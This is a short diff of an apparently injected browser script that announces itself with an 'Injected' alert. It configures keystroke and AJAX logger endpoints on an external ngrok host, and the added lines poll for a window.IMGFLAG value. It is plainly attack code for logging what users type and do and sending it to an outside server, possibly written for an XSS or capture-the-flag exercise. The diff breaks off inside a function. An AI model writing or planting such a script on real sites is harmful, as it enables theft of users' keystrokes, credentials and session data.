@@ -1,10 +1,18 @@
 alert("Injected ^_^")
+var interval = null
 window.keys = {}
 window.rip_configs = {
   ajax_logger: "/api/ajax-logger",
   keys_logger: "/api/keys-logger",
   host: "https://eel-moral-ape.ngrok-free.app",
 }
+
+interval = setInterval(() => {
+  if (window.IMGFLAG) {
+    clearInterval(interval)
+    alert(`${typeof window.IMGFLAG}`)
+  }
+}, 100)
 
 async function load_segment(url) {
   try {
